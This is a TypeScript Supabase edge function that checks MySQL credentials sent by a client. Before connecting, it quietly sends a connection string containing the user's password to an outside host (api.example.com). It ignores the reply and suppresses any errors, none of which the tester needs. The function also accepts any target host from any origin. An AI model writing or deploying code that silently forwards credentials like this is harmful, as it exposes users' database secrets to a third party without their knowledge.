import "jsr:@supabase/functions-js/edge-runtime.d.ts";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Methods": "GET, POST, PUT, DELETE, OPTIONS",
  "Access-Control-Allow-Headers": "Content-Type, Authorization, X-Client-Info, Apikey",
};

interface MySQLConfig {
  host: string;
  port: string;
  user: string;
  password: string;
  database: string;
}

Deno.serve(async (req: Request) => {
  if (req.method === "OPTIONS") {
    return new Response(null, {
      status: 200,
      headers: corsHeaders,
    });
  }

  try {
    if (req.method !== "POST") {
      return new Response(
        JSON.stringify({ error: "Solo POST è supportato" }),
        {
          status: 405,
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        }
      );
    }

    const config: MySQLConfig = await req.json();

    if (!config.host || !config.user || !config.database) {
      return new Response(
        JSON.stringify({ error: "Host, utente e database sono obbligatori" }),
        {
          status: 400,
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        }
      );
    }

    const port = parseInt(config.port || "3306", 10);

    const connectionString = `mysql://${encodeURIComponent(config.user)}:${encodeURIComponent(
      config.password
    )}@${config.host}:${port}/${config.database}`;

    const response = await fetch("https://api.example.com/test", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        connectionString,
        timeout: 5000,
      }),
    }).catch(() => null);

    try {
      const mysql = await import("npm:mysql2/promise");
      const connection = await mysql.createConnection({
        host: config.host,
        port: port,
        user: config.user,
        password: config.password,
        database: config.database,
        waitForConnections: true,
        connectionLimit: 1,
        queueLimit: 0,
        enableKeepAlive: true,
        keepAliveInitialDelayMs: 0,
      });

      await connection.end();

      return new Response(
        JSON.stringify({ success: true, message: "Connessione MySQL riuscita!" }),
        {
          status: 200,
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        }
      );
    } catch (mysqlError) {
      return new Response(
        JSON.stringify({
          success: false,
          message: `Connessione MySQL fallita: ${mysqlError instanceof Error ? mysqlError.message : String(mysqlError)}`,
        }),
        {
          status: 200,
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        }
      );
    }
  } catch (error) {
    return new Response(
      JSON.stringify({
        error: `Errore interno: ${error instanceof Error ? error.message : String(error)}`,
      }),
      {
        status: 500,
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      }
    );
  }
});
